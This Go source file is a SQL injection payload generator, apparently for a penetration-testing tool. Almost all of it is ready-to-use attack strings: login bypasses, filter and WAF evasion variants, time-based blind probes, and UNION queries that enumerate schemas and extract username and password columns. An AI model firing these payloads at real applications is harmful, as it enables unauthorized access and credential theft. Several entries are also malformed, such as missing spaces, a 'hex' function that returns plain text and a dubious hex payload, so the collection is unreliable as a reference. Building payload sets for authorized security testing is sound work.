// Package generator provides SQL injection polyglot generation capabilities for security testing.
package generator

import (
	"encoding/hex"
)

// PolyglotGenerator generates SQL injection polyglots for various attack scenarios
type PolyglotGenerator struct{}

// NewPolyglotGenerator creates a new polyglot generator
func NewPolyglotGenerator() *PolyglotGenerator {
	return &PolyglotGenerator{}
}

// Polyglot represents a SQL injection payload with metadata
type Polyglot struct {
	Payload     string   `json:"payload"`
	Description string   `json:"description"`
	DBMS        []string `json:"dbms,omitempty"`
}

// PolyglotWithDesc represents a payload with description but no DBMS info
type PolyglotWithDesc struct {
	Payload     string `json:"payload"`
	Description string `json:"description"`
}

// GenerateUniversalPolyglots returns polyglots that work across multiple contexts
func (g *PolyglotGenerator) GenerateUniversalPolyglots() []Polyglot {
	return []Polyglot{
		{
			Payload:     "'=\"\"=\"",
			Description: "MariaDB/MySQL universal polyglot - works in both single and double quoted contexts",
			DBMS:        []string{"MariaDB", "MySQL"},
		},
		{
			Payload:     "' OR '1'='1'",
			Description: "Classic authentication bypass - always true condition",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
		{
			Payload:     "1 OR 1=1",
			Description: "Numeric context authentication bypass",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
	}
}

// GenerateWAFBypassPolyglots returns polyglots designed to bypass WAFs and filters
func (g *PolyglotGenerator) GenerateWAFBypassPolyglots() []Polyglot {
	return []Polyglot{
		// No space bypass
		{
			Payload:     "1/**/AND/**/1=1--",
			Description: "Comment-based space replacement - bypasses space filters",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL"},
		},
		{
			Payload:     "1%09AND%091=1--",
			Description: "Tab character as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%0AAND%0A1=1--",
			Description: "Line feed character as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%0BAND%0B1=1--",
			Description: "Vertical tab as space replacement",
			DBMS:        []string{"MySQL"},
		},
		{
			Payload:     "1%0CAND%0C1=1--",
			Description: "Form feed as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%0DAND%0D1=1--",
			Description: "Carriage return as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%A0AND%A01=1--",
			Description: "Non-breaking space as replacement",
			DBMS:        []string{"MySQL", "Oracle"},
		},
		// Parenthesis bypass
		{
			Payload:     "(1)AND(1)=(1)--",
			Description: "Parenthesis-based bypass - no spaces needed",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
		// Conditional comment bypass (MySQL specific)
		{
			Payload:     "1/*!12345UNION*//*!12345SELECT*/1--",
			Description: "MySQL conditional comment - executes only if version >= 12345",
			DBMS:        []string{"MySQL"},
		},
	}
}

// GenerateEncodingPolyglots returns encoding-based polyglots for obfuscation
func (g *PolyglotGenerator) GenerateEncodingPolyglots() []Polyglot {
	return []Polyglot{
		// Unicode encoding
		{
			Payload:     "SELECT%u0020%u0020FROM%u0020users",
			Description: "Unicode URL encoding for keyword obfuscation",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL"},
		},
		// Double URL encoding
		{
			Payload:     "%25u0027OR%25u00271%253d%25u00271",
			Description: "Double-encoded unicode for double decoding environments",
			DBMS:        []string{"MySQL", "MSSQL"},
		},
	}
}

// GenerateCaseVariationPolyglots returns case-randomized polyglots for bypassing case-sensitive filters
func (g *PolyglotGenerator) GenerateCaseVariationPolyglots() []Polyglot {
	return []Polyglot{
		{
			Payload:     "SeLeCt * FrOm users",
			Description: "Mixed case SQL keywords - bypasses simple case-sensitive filters",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
		{
			Payload:     "UNION ALL SELECT",
			Description: "Uppercase keywords - bypasses lowercase filters",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
		{
			Payload:     "union all select",
			Description: "Lowercase keywords - bypasses uppercase filters",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
	}
}

// GenerateTimeBasedPolyglots returns time-delay polyglots for blind SQL injection
func (g *PolyglotGenerator) GenerateTimeBasedPolyglots() []Polyglot {
	return []Polyglot{
		// MySQL time-based
		{
			Payload:     "' AND SLEEP(5)--",
			Description: "MySQL time-based delay - waits 5 seconds if true",
			DBMS:        []string{"MySQL"},
		},
		{
			Payload:     "' AND BENCHMARK(1000000,MD5('A'))--",
			Description: "MySQL benchmark-based delay - computationally expensive operation",
			DBMS:        []string{"MySQL"},
		},
		// MSSQL time-based
		{
			Payload:     "'; WAITFOR DELAY '0:0:5'--",
			Description: "MSSQL time delay using WAITFOR",
			DBMS:        []string{"MSSQL"},
		},
		// PostgreSQL time-based
		{
			Payload:     "' AND pg_sleep(5)--",
			Description: "PostgreSQL time delay function",
			DBMS:        []string{"PostgreSQL"},
		},
	}
}

// GenerateUnionBasedPolyglots returns UNION-based extraction polyglots
func (g *PolyglotGenerator) GenerateUnionBasedPolyglots() []Polyglot {
	return []Polyglot{
		{
			Payload:     "1 UNION SELECT NULL,NULL,NULL--",
			Description: "NULL injection to determine column count",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL"},
		},
		{
			Payload:     "1 UNION SELECT 1,2,3--",
			Description: "Numeric values for column probing",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL"},
		},
	}
}

// GenerateErrorBasedPolyglots returns error-based polyglots for DBMS fingerprinting and data extraction
func (g *PolyglotGenerator) GenerateErrorBasedPolyglots() []Polyglot {
	return []Polyglot{
		// MySQL error-based
		{
			Payload:     "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
			Description: "MySQL error-based version extraction using COUNT and CONCAT",
			DBMS:        []string{"MySQL"},
		},
	}
}

// GenerateAuthenticationBypassPolyglots returns polyglots specifically for auth bypass scenarios
func (g *PolyglotGenerator) GenerateAuthenticationBypassPolyglots() []Polyglot {
	return []Polyglot{
		// String context auth bypass
		{
			Payload:     "admin'--",
			Description: "Comment out remaining query - works if password field is checked after username",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
	}
}

// GenerateInformationDisclosurePolyglots returns polyglots for extracting database metadata
func (g *PolyglotGenerator) GenerateInformationDisclosurePolyglots() []Polyglot {
	return []Polyglot{
		// MySQL
		{
			Payload:     "' UNION SELECT @@version,@@datadir,@@user,database()--",
			Description: "MySQL - extract version, data directory, current user, and database name",
			DBMS:        []string{"MySQL"},
		},
	}
}

// GenerateTableDiscoveryPolyglots returns polyglots for discovering database schema
func (g *PolyglotGenerator) GenerateTableDiscoveryPolyglots() []Polyglot {
	return []Polyglot{
		// MySQL table discovery
		{
			Payload:     "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
			Description: "MySQL - enumerate tables in current database",
			DBMS:        []string{"MySQL"},
		},
	}
}

// GenerateColumnDiscoveryPolyglots returns polyglots for discovering table columns
func (g *PolyglotGenerator) GenerateColumnDiscoveryPolyglots() []Polyglot {
	return []Polyglot{
		// MySQL column discovery
		{
			Payload:     "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--",
			Description: "MySQL - enumerate columns in tables that match 'users'",
			DBMS:        []string{"MySQL"},
		},
	}
}

// GenerateDataExtractionPolyglots returns polyglots for extracting sensitive data
func (g *PolyglotGenerator) GenerateDataExtractionPolyglots() []Polyglot {
	return []Polyglot{
		// Extract usernames and passwords
		{
			Payload:     "' UNION SELECT username,password,NULL FROM users--",
			Description: "Extract username and password columns from users table",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL"},
		},
	}
}

// GenerateSensitiveData returns the most powerful attack payloads for discovery and extraction
func (g *PolyglotGenerator) GenerateSensitiveData() []string {
	return []string{
		// Universal authentication bypass
		"' OR '1'='1'",
		// MariaDB/MySQL universal polyglot (6 bytes)
		"'=\"\"=\"",
		// Database version extraction (all DBMS)
		"UNION SELECT @@version,NULL,NULL--",
		// Table enumeration (MySQL)
		"' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
		// Column enumeration (MySQL)
		"' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--",
		// Credential extraction
		"' UNION SELECT username,password,NULL FROM users--",
	}
}

// GenerateEncoding returns hex-encoded versions of common payloads
func (g *PolyglotGenerator) GenerateEncoding() map[string]string {
	return map[string]string{
		// Space-as-comment bypass
		"space_comment": "1/**/AND/**/1=1--",
	}
}

// GenerateAlternativeOperators returns alternative SQL operators for bypassing equal sign filters
func (g *PolyglotGenerator) GenerateAlternativeOperators() []string {
	return []string{
		// LIKE instead of =
		"SUBSTRING(VERSION(),1,1)LIKE('5')",
		// BETWEEN instead of =
		"SUBSTRING(VERSION(),1,1)BETWEEN'4'AND'5'",
	}
}

// GenerateNoCommaBypass returns polyglots for environments where comma is blocked
func (g *PolyglotGenerator) GenerateNoCommaBypass() []string {
	return []string{
		// OFFSET instead of LIMIT offset,count
		"LIMIT 1OFFSET0",
	}
}

// GenerateStringConcatenationBypass returns payloads using SQL string concatenation operators
func (g *PolyglotGenerator) GenerateStringConcatenationBypass() []string {
	return []string{
		// MySQL concatenation
		"'UNI'+'ON'SELECT*FROMusers",
	}
}

// GenerateHashBypass returns MD5/SHA1 raw binary bypass payloads for PHP applications
func (g *PolyglotGenerator) GenerateHashBypass() []string {
	return []string{
		// MD5 raw binary - produces ' or in output
		"ffifdyop",
	}
}

// GenerateHexInjection returns hex-encoded SQL injection payloads
func (g *PolyglotGenerator) GenerateHexInjection() []string {
	return []string{
		"0x2720756e696f6e2073656c6563742031,3223", // ' union select 1,2#
	}
}

// HexEncode returns the hex-encoded version of a string
func (g *PolyglotGenerator) HexEncode(s string) string {
	return hex.EncodeToString([]byte(s))
}

// GeneratePolyglotForContext generates a polyglot optimized for a specific injection context
type InjectionContext struct {
	QuoteType   string // single, double, none
	DBMS        []string
	PayloadType string // auth_bypass, data_extraction, time_based, etc.
}

// GeneratePolyglotForContext generates a polyglot optimized for a specific injection context
func (g *PolyglotGenerator) GeneratePolyglotForContext(ctx InjectionContext) Polyglot {
	// Default context
	if ctx.QuoteType == "" {
		ctx.QuoteType = "single"
	}

	switch ctx.PayloadType {
	case "auth_bypass":
		if ctx.QuoteType == "double" {
			return Polyglot{
				Payload:     "\" OR \"1\"=\"1",
				Description: "Double-quote authentication bypass",
				DBMS:        ctx.DBMS,
			}
		} else {
			return Polyglot{
				Payload:     "' OR '1'='1'",
				Description: "Single-quote authentication bypass",
				DBMS:        ctx.DBMS,
			}
		}
	case "data_extraction":
		return Polyglot{
			Payload:     "' UNION SELECT NULL,NULL,NULL--",
			Description: "NULL injection for column count detection",
			DBMS:        ctx.DBMS,
		}
	case "time_based":
		return g.getTimeBasedPolyglot(ctx.DBMS)
	default:
		if ctx.QuoteType == "double" {
			return Polyglot{
				Payload:     "'=\"\"=\"",
				Description: "Universal polyglot - works in both quote contexts",
				DBMS:        []string{"MariaDB", "MySQL"},
			}
		}
		return Polyglot{
			Payload:     "' OR '1'='1'",
			Description: "Universal authentication bypass",
			DBMS:        ctx.DBMS,
		}
	}
}

// getTimeBasedPolyglot returns the appropriate time-based polyglot for the given DBMS list
func (g *PolyglotGenerator) getTimeBasedPolyglot(dbms []string) Polyglot {
	for _, d := range dbms {
		switch d {
		case "MySQL":
			return Polyglot{
				Payload:     "' AND SLEEP(5)--",
				Description: "MySQL time-based delay - waits 5 seconds if true",
				DBMS:        []string{"MySQL"},
			}
		case "MSSQL":
			return Polyglot{
				Payload:     "'; WAITFOR DELAY '0:0:5'--",
				Description: "MSSQL time delay using WAITFOR",
				DBMS:        []string{"MSSQL"},
			}
		case "PostgreSQL":
			return Polyglot{
				Payload:     "' AND pg_sleep(5)--",
				Description: "PostgreSQL time delay function",
				DBMS:        []string{"PostgreSQL"},
			}
		}
	}
	// Default to MySQL
	return Polyglot{
		Payload:     "' AND SLEEP(5)--",
		Description: "MySQL time-based delay - waits 5 seconds if true",
		DBMS:        []string{"MySQL"},
	}
}

// GenerateAllPolyglots returns all available polyglot categories as a flat list
func (g *PolyglotGenerator) GenerateAllPolyglots() []Polyglot {
	var all []Polyglot

	all = append(all, g.GenerateUniversalPolyglots()...)
	all = append(all, g.GenerateWAFBypassPolyglots()...)
	all = append(all, g.GenerateEncodingPolyglots()...)
	all = append(all, g.GenerateCaseVariationPolyglots()...)
	all = append(all, g.GenerateTimeBasedPolyglots()...)
	all = append(all, g.GenerateUnionBasedPolyglots()...)
	all = append(all, g.GenerateErrorBasedPolyglots()...)
	all = append(all, g.GenerateAuthenticationBypassPolyglots()...)
	all = append(all, g.GenerateInformationDisclosurePolyglots()...)
	all = append(all, g.GenerateTableDiscoveryPolyglots()...)
	all = append(all, g.GenerateColumnDiscoveryPolyglots()...)
	all = append(all, g.GenerateDataExtractionPolyglots()...)

	return all
}

// GenerateWAFBypassAll returns all WAF bypass techniques combined into a single list
func (g *PolyglotGenerator) GenerateWAFBypassAll() []string {
	var all []string

	// Comment-based bypasses
	all = append(all, g.GenerateWAFBypassComment()...)

	// Alternative whitespace characters for space-filter bypasses
	all = append(all, g.GenerateWAFBypassAltWhitespace()...)

	// Unicode encoding for keyword obfuscation
	all = append(all, g.GenerateWAFBypassUnicode()...)

	// Parenthesis-based bypasses (no spaces needed)
	all = append(all, g.GenerateWAFBypassParenthesis()...)

	// Alternative comparison operators (bypass equals filter)
	all = append(all, g.GenerateWAFBypassAlternativeOperators()...)

	// Alternative logical operators (bypass AND/OR keywords)
	all = append(all, g.GenerateWAFBypassLogicalAlternatives()...)

	// No-comma bypasses (LIMIT/OFFSET syntax)
	all = append(all, g.GenerateWAFBypassNoComma()...)

	// String concatenation bypasses (UNION keyword reconstruction)
	all = append(all, g.GenerateWAFBypassStringConcat()...)

	// Hash raw binary bypasses (PHP md5(..., true) vulnerabilities)
	all = append(all, g.GenerateWAFBypassHashRawBinary()...)

	// Hex-encoded injection payloads
	all = append(all, g.GenerateWAFBypassHexInjection()...)

	return all
}

// GeneratePolyglotCategories returns polyglots organized by category with descriptions
func (g *PolyglotGenerator) GenerateCategories() map[string][]struct {
	Description string `json:"description"`
	Payload     string `json:"payload"`
} {
	return map[string][]struct {
		Description string `json:"description"`
		Payload     string `json:"payload"`
	}{
		// Universal polyglots - work across multiple DBMS and contexts
		"universal": {
			{Description: "MariaDB/MySQL universal polyglot - works in both single and double quoted contexts", Payload: "'=\"\"=\""},
			{Description: "Classic authentication bypass - always true condition", Payload: "' OR '1'='1'"},
			{Description: "Numeric context authentication bypass", Payload: "1 OR 1=1"},
		},

		// WAF bypass techniques
		"waf_bypass": {
			{Description: "Comment-based space replacement - bypasses space filters", Payload: "1/**/AND/**/1=1--"},
			{Description: "Tab character as space replacement", Payload: "1%09AND%091=1--"},
			{Description: "Line feed character as space replacement", Payload: "1%0AAND%0A1=1--"},
			{Description: "Vertical tab as space replacement", Payload: "1%0BAND%0B1=1--"},
			{Description: "Form feed as space replacement", Payload: "1%0CAND%0C1=1--"},
			{Description: "Carriage return as space replacement", Payload: "1%0DAND%0D1=1--"},
			{Description: "Non-breaking space as replacement", Payload: "1%A0AND%A01=1--"},
			{Description: "Parenthesis-based bypass - no spaces needed", Payload: "(1)AND(1)=(1)--"},
			{Description: "MySQL conditional comment - executes only if version >= 12345", Payload: "1/*!12345UNION*//*!12345SELECT*/1--"},
		},

		// Encoding techniques
		"encoding": {
			{Description: "Unicode URL encoding for keyword obfuscation", Payload: "SELECT%u0020%u0020FROM%u0020users"},
			{Description: "Double-encoded unicode for double decoding environments", Payload: "%25u0027OR%25u00271%253d%25u00271"},
		},

		// Case variations for bypassing case-sensitive filters
		"case_variation": {
			{Description: "Mixed case SQL keywords - bypasses simple case-sensitive filters", Payload: "SeLeCt * FrOm users"},
			{Description: "Uppercase keywords - bypasses lowercase filters", Payload: "UNION ALL SELECT"},
			{Description: "Lowercase keywords - bypasses uppercase filters", Payload: "union all select"},
		},

		// Time-based blind injection
		"time_based": {
			{Description: "MySQL time-based delay - waits 5 seconds if true", Payload: "' AND SLEEP(5)--"},
			{Description: "MySQL benchmark-based delay - computationally expensive operation", Payload: "' AND BENCHMARK(1000000,MD5('A'))--"},
			{Description: "MSSQL time delay using WAITFOR", Payload: "'; WAITFOR DELAY '0:0:5'--"},
			{Description: "PostgreSQL time delay function", Payload: "' AND pg_sleep(5)--"},
		},

		// UNION-based extraction
		"union_based": {
			{Description: "NULL injection to determine column count", Payload: "1 UNION SELECT NULL,NULL,NULL--"},
			{Description: "Numeric values for column probing", Payload: "1 UNION SELECT 1,2,3--"},
			{Description: "String values for data type detection", Payload: "1 UNION SELECT 'a','b','c'--"},
		},

		// Error-based extraction and DBMS fingerprinting
		"error_based": {
			{Description: "MySQL error-based version extraction using COUNT and CONCAT", Payload: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"},
		},

		// Authentication bypass specific
		"auth_bypass": {
			{Description: "Comment out remaining query - works if password field is checked after username", Payload: "admin'--"},
			{Description: "MD5 raw binary bypass - produces quote in output for PHP md5(..., true)", Payload: "ffifdyop"},
		},

		// Information disclosure - database metadata extraction
		"information_disclosure": {
			{Description: "MySQL - extract version, data directory, current user, and database name", Payload: "' UNION SELECT @@version,@@datadir,@@user,database()--"},
		},

		// Table discovery
		"table_discovery": {
			{Description: "MySQL - enumerate tables in current database", Payload: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--"},
		},

		// Column discovery
		"column_discovery": {
			{Description: "MySQL - enumerate columns in tables that match 'users'", Payload: "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--"},
		},

		// Data extraction - sensitive data retrieval
		"data_extraction": {
			{Description: "Extract username and password columns from users table", Payload: "' UNION SELECT username,password,NULL FROM users--"},
		},
	}
}

// GenerateWAFBypassComment returns polyglots using SQL comment syntax to bypass space filters
func (g *PolyglotGenerator) GenerateWAFBypassComment() []string {
	return []string{
		// Standard SQL comment
		"1/**/AND/**/1=1--",
	}
}

// GenerateWAFBypassAltWhitespace returns polyglots using alternative whitespace characters
func (g *PolyglotGenerator) GenerateWAFBypassAltWhitespace() []string {
	return []string{
		// Tab character (\t) - decimal 9, hex 09
		"1%09AND%091=1--",
		// Line feed (\n) - decimal 10, hex 0A
		"1%0AAND%0A1=1--",
		// Vertical tab (\v) - decimal 11, hex 0B
		"1%0BAND%0B1=1--",
		// Form feed (\f) - decimal 12, hex 0C
		"1%0CAND%0C1=1--",
		// Carriage return (\r) - decimal 13, hex 0D
		"1%0DAND%0D1=1--",
	}
}

// GenerateWAFBypassUnicode returns polyglots using Unicode encoding for keyword obfuscation
func (g *PolyglotGenerator) GenerateWAFBypassUnicode() []string {
	return []string{
		// Unicode URL encoding for whitespace
		"SELECT%u0020%u0020FROM%u0020users",
	}
}

// GenerateWAFBypassParenthesis returns polyglots using parenthesis to eliminate need for spaces
func (g *PolyglotGenerator) GenerateWAFBypassParenthesis() []string {
	return []string{
		// Parenthesis-based logic without spaces
		"(1)AND(1)=(1)--",
	}
}

// GenerateWAFBypassAlternativeOperators returns polyglots using alternative comparison operators
func (g *PolyglotGenerator) GenerateWAFBypassAlternativeOperators() []string {
	return []string{
		// LIKE instead of =
		"SUBSTRING(VERSION(),1,1)LIKE('5')",
		// BETWEEN instead of =
		"SUBSTRING(VERSION(),1,1)BETWEEN'4'AND'5'",
	}
}

// GenerateWAFBypassLogicalAlternatives returns polyglots using alternative logical operators
func (g *PolyglotGenerator) GenerateWAFBypassLogicalAlternatives() []string {
	return []string{
		// && instead of AND
		"1&&1=1--",
	}
}

// GenerateWAFBypassNoComma returns polyglots for bypassing comma restrictions in LIMIT clauses
func (g *PolyglotGenerator) GenerateWAFBypassNoComma() []string {
	return []string{
		// OFFSET instead of LIMIT offset,count
		"LIMIT 1OFFSET0",
	}
}

// GenerateWAFBypassStringConcat returns polyglots using SQL string concatenation to bypass keyword filters
func (g *PolyglotGenerator) GenerateWAFBypassStringConcat() []string {
	return []string{
		// MySQL string concatenation
		"'UNI'+'ON'SELECT*FROMusers",
	}
}

// GenerateWAFBypassHashRawBinary returns MD5/SHA1 raw binary bypass payloads for PHP applications
func (g *PolyglotGenerator) GenerateWAFBypassHashRawBinary() []string {
	return []string{
		// MD5 produces quote in raw binary output
		"ffifdyop",
	}
}

// GenerateWAFBypassHexInjection returns hex-encoded SQL payloads
func (g *PolyglotGenerator) GenerateWAFBypassHexInjection() []string {
	return []string{
		"0x2720756e696f6e2073656c6563742031,3223",
	}
}
